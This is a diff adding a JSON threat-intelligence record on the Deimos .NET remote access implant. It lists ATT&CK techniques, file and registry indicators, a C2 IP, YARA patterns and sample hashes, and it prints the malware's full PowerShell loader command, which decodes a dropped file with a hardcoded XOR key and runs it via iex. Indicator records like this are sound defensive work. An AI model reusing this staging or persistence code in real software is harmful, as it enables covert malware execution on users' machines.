@@ -1,0 +1,251 @@
+{
+  "malware_family": "Deimos",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Deimos is a .NET remote access implant used for initial access and persistence, evolving from the Jupyter Infostealer/SolarMarker family. It employs multi-layered obfuscation using runtime-generated variables, XOR ciphers, and Base64 encoding to deliver its final payload. Persistence is achieved via a .LNK file in the Startup folder and a custom file handler registered in the HKCU hive to launch a PowerShell loader.",
+  "mitre_techniques": [
+    "T1583.003",
+    "T1587.001",
+    "T1588.003",
+    "T1189",
+    "T1059.001",
+    "T1204.002",
+    "T1547.001",
+    "T1140",
+    "T1027.005",
+    "T1071.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -command \"$650326ac2b1100c4508b8a700b658ad7='C:\\Users\\user1\\d2e227be5d58955a8d12db18fca5d787\\a5fb52fc397f782c691961d23cf5e785\\4284a9859ab2184b017070368b4a73cd\\89555a8780abdb39d3f1761918c40505\\83e4d9dd7a7735a516696a49efcc2269\\d1c086bb3efeb05d8098a20b80fc3c1a\\650326ac2b1100c4508b8a700b658ad7';$1e3dadee7a4b45213f674cb23b07d4b0='hYaAOxeocQMPVtECUZFJwGHzKnmqITrlyuNiDRkpgdWbSsfjvLBX';$d6ffa847bb31b563e9b7b08aad22d447=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($650326ac2b1100c4508b8a700b658ad7));remove-item $650326ac2b1100c4508b8a700b658ad7;for($i=0;$i -lt $d6ffa847bb31b563e9b7b08aad22d447.count;)\\{for($j=0;$j -lt $1e3dadee7a4b45213f674cb23b07d4b0.length;$j++)\\{$d6ffa847bb31b563e9b7b08aad22d447[$i]=$d6ffa847bb31b563e9b7b08aad22d447[$i] -bxor $1e3dadee7a4b45213f674cb23b07d4b0[$j];$i++;if($i -ge $d6ffa847bb31b563e9b7b08aad22d447.count)\\{$j=$1e3dadee7a4b45213f674cb23b07d4b0.length\\}\\}\\};$d6ffa847bb31b563e9b7b08aad22d447=[System.Text.Encoding]::UTF8.GetString($d6ffa847bb31b563e9b7b08aad22d447);iex $d6ffa847bb31b563e9b7b08aad22d447;\"",
+      "context": "PowerShell command executed by the installer to decrypt the next stage.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\\\Users\\\\[^\\\\]*\\\\([a-z0-9]{32}\\\\){6}[a-z0-9]{32}",
+      "context": "Regex for path to initial dropped file containing obfuscated installer.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "hYaAOxeocQMPVtECUZFJwGHzKnmqITrlyuNiDRkpgdWbSsfjvLBX",
+      "context": "Static 52-byte XOR key used to decrypt first stage payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "XjBrPGQ7aipqcXYkbTQobjJEX0ZzPGlOfm5YbUEmb1dBazZ0RlpCa2hLQks8eXNxK3tsRHpZVmtmUU9mb31jaVVuMXUxUGk/e0tDa0QmXjA8U0ZAckhgNl5vX1deQGBad2peTyZvVUByaSk2XlBJMTxAdEtnT0B3fnBJPCtfe2tvV0d7P3Y0V2BaeXQ9PmhtI3ZaVHc3I2tGcm5IRmlmUTV8bXpxXlg/cyo8XyFwXyt5QmwjOChQZ09aPXxqaS1hfmxDK3U=",
+      "context": "XOR key used to decrypt the final .NET DLL payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "assembly_name",
+      "value": "Mars.Deimos",
+      "context": "The internal name of the .NET DLL payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "[Mars.Deimos]::interact()",
+      "context": "Class method called to execute the final .NET DLL payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": ".*\\\\APPDATA\\\\ROAMING\\\\[A-Za-z0-9_]{96,192}",
+      "context": "Path regex for the unique 'hwid' file.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "a44f066dfa44db9fba953a982d48b.LNk",
+      "context": "Hardcoded name of the persistence LNK file in the Startup folder.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\[a-z0-9]{10,20}\\Shell\\Open\\Command",
+      "context": "Registry key path pattern for persistence via file handler.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "PowErShELl",
+      "context": "Example of mixed-case string in persistence registry command.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\\\[A-Z0-9]{24}.exe",
+      "context": "Path pattern for downloaded executable payloads.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{\\\"action\\\":\\\"ping\\\",\\\"",
+      "context": "YARA rule string for C2 communication.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 00 57 00 58 00 59 00 5A 00 5F 00 00 17 75 00 73 00 65 00 72 00 }",
+      "context": "YARA rule hex pattern $b1 for Deimos DLL.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 0C 08 16 1F 68 9D 08 17 1F 77 9D 08 18 1F 69 9D 08 19 1F 64 9D }",
+      "context": "YARA rule hex pattern $b2 for Deimos DLL.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SlimReader Setup",
+      "context": "File Description metadata from lure file installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "(c) InvestTech",
+      "context": "Legal Copyright metadata from lure file installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SlimReader",
+      "context": "Product Name metadata from lure file installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1.4.1.2",
+      "context": "Product Version metadata from lure file installer.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "216.230.232.134",
+      "context": "Command and control server.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/",
+      "context": "C2 POST requests are sent to the root path.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Connection: Keep-Alive",
+      "context": "Default .Net WebRequest header present in C2 traffic.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "f268491d2f7e9ab562a239ec56c4b38d669a7bd88181efb0bd89e450c68dd421",
+      "description": "Lure file"
+    },
+    {
+      "sha256": "af1e952b5b02ca06497e2050bd1ce8d17b9793fdb791473bdae5d994056cb21f",
+      "description": "Malware installer"
+    },
+    {
+      "sha256": "d6e1c6a30356009c62bc2aa24f49674a7f492e5a34403344bfdd248656e20a54",
+      "description": ".NET DLL file"
+    },
+    {
+      "sha256": "2c1941847f660a99bbc6de16b00e563f70d900f9dbc40c6734871993961d3d3e",
+      "description": "Reference sample for Deimos DLL YARA rule."
+    }
+  ],
+  "file_types": [
+    "pe",
+    "dotnet",
+    "script"
+  ]
+}
